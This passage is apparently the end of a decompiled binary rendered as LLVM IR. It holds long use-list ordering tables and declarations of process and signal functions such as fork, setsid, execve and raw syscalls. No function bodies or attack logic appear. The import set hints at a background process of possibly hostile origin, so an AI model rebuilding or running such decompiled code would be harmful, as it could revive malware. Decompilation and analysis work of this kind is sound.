1974, 1769, 434, 435, 409, 1975, 1977, 410, 411, 1976, 240, 1978, 1770, 436, 437, 406, 1979, 1981, 407, 408, 1980, 239, 1982, 1771, 438, 439, 403, 1983, 1985, 404, 405, 1984, 238, 1986, 1987, 1988, 1989, 1990, 1991, 1992, 1772, 440, 441, 400, 1993, 1995, 401, 402, 1994, 237, 1996, 1773, 442, 443, 397, 1997, 1999, 398, 399, 1998, 236, 2000, 1774, 444, 445, 422, 1775, 1776, 446, 447, 423, 217, 2001, 2002, 1777, 448, 449, 2003, 2004, 1778, 450, 451, 1779, 452, 453, 424, 2005, 1780, 454, 455, 425, 2006, 1781, 456, 457, 1782, 458, 459, 1783, 500, 501, 104, 2017, 45, 2007, 2008, 2009, 1749, 298, 2010, 2011, 2012, 2013, 1750, 297, 2014, 2015, 2016, 44, 2018, 2019, 2020, 19, 105, 2027, 47, 2021, 2022, 2023, 1751, 299, 2024, 2025, 2026, 46, 2028, 2029, 2030, 20, 2032, 300, 2033, 48, 301, 2034, 222, 2035, 1784, 461, 462, 1785, 463, 464, 1786, 465, 466, 1787, 467, 468, 1788, 469, 470, 223, 1789, 471, 472, 2036, 333, 2037, 2038, 2039, 2040, 460, 2041, 1752, 2042, 2043, 473, 137, 2044, 2045, 49, 304, 2046, 334, 2047, 2048, 2049, 2050, 2051, 474, 2052, 302, 50, 303, 2053, 2054, 2055, 2056, 252, 477, 475, 476, 1753, 1754, 478, 51, 2057, 2058, 52, 79, 253, 254, 255, 2059, 479, 291, 305, 480, 1881, 1882, 1883, 1884, 1885, 1886, 1887, 1888, 1889, 1890, 1891, 1892, 1893, 1894, 1895, 1896, 1897, 1898, 1899, 1900, 1901, 1902, 1903, 1755, 1904, 1905, 1756, 309, 1906, 1907, 306, 307, 308, 1908, 1909, 1757, 482, 1910, 2089, 2090, 108, 10, 481, 2091, 106, 107, 483, 1758, 17, 53, 54, 2092, 55, 80, 2093, 310, 335, 484, 485, 486, 311, 1759, 2094, 487, 2095, 2096, 2097, 292, 2098, 113, 2099, 2100, 2101, 56, 109, 110, 111, 112, 1760, 2103, 57, 58, 59, 60, 61, 11, 12, 13, 14, 2104, 2106, 2107, 2108, 490, 2109, 488, 312, 489, 313, 2105, 336, 491, 492, 293, 314, 294, 15, 295, 1790, 493, 2111, 256, 257, 258, 259, 495, 2112, 494, 496, 315, 2113, 2114, 497, 260, 2456, 498, 499, 2457, 2459, 2460, 2461, 1791, 318, 317, 316, 321, 319, 320, 114, 62, 81, 63, 2462, 502, 64, 115, 503, 504, 2466, 505, 2465, 507, 508, 116, 506, 509, 510, 2473, 2474, 337, 2475, 2476, 138, 2477, 65, 338, 117, 1792, 2483, 511, 512, 513, 2484, 515, 514, 2490, 2491, 2492, 2493, 516, 66, 517, 518, 519, 520, 521, 2534, 121, 120, 67, 324, 325, 2525, 2526, 2527, 2528, 244, 322, 323, 326, 2529, 2530, 2531, 2532, 68, 69, 70, 2533, 339, 71, 72, 2535, 2536, 327, 16, 2537, 2538, 2539, 218, 1911, 245, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 1650, 1651, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691, 1692, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 1735, 1736, 1737, 1738, 1739, 1740, 2588, 2589, 2590, 2591, 2592, 2593, 2594, 2595 }
  uselistorder i32* @ebx, { 75, 437, 1, 438, 439, 440, 2, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 3, 456, 4, 457, 458, 459, 460, 461, 463, 466, 467, 468, 469, 470, 464, 462, 465, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 492, 5, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 505, 503, 504, 506, 507, 139, 140, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 6, 538, 7, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 711, 712, 9, 564, 555, 553, 554, 556, 559, 557, 558, 560, 561, 562, 8, 563, 565, 566, 567, 568, 569, 570, 571, 10, 572, 11, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 587, 588, 589, 590, 12, 591, 592, 593, 13, 594, 14, 595, 596, 597, 598, 599, 774, 775, 15, 776, 777, 780, 781, 600, 699, 700, 701, 713, 16, 714, 715, 167, 716, 717, 782, 783, 784, 785, 786, 88, 787, 718, 719, 720, 721, 722, 788, 789, 790, 31, 32, 803, 804, 805, 822, 823, 824, 827, 28, 17, 26, 806, 816, 820, 821, 791, 168, 169, 170, 171, 172, 173, 174, 175, 792, 793, 794, 795, 802, 121, 122, 176, 177, 178, 179, 180, 181, 182, 186, 89, 90, 91, 92, 93, 191, 192, 18, 0, 193, 213, 214, 95, 194, 195, 196, 94, 96, 215, 216, 217, 812, 813, 97, 98, 99, 100, 723, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 19, 738, 739, 724, 725, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 29, 751, 752, 753, 754, 755, 20, 756, 757, 758, 759, 760, 761, 762, 763, 764, 810, 811, 183, 184, 185, 670, 671, 672, 673, 674, 675, 21, 676, 677, 678, 679, 680, 681, 682, 683, 684, 828, 829, 830, 831, 832, 833, 834, 838, 839, 203, 204, 601, 602, 691, 692, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 644, 645, 22, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 23, 659, 660, 661, 662, 663, 664, 71, 72, 73, 74, 639, 641, 640, 642, 643, 665, 666, 667, 668, 669, 796, 24, 797, 798, 799, 800, 30, 25, 27, 801, 840, 841, 842, 843, 844, 187, 188, 189, 778, 779, 197, 198, 808, 809, 101, 102, 685, 686, 697, 698, 103, 104, 105, 702, 703, 814, 815, 769, 770, 771, 835, 836, 837, 704, 705, 772, 773, 825, 826, 432, 433, 706, 707, 708, 709, 710, 106, 107, 108, 118, 119, 120, 807, 817, 818, 819, 109, 110, 111, 112, 113, 114, 115, 116, 117, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 190, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 199, 200, 201, 202, 205, 206, 207, 208, 209, 210, 211, 212, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 434, 435, 436, 687, 688, 689, 690, 693, 694, 695, 696, 765, 766, 767, 768 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
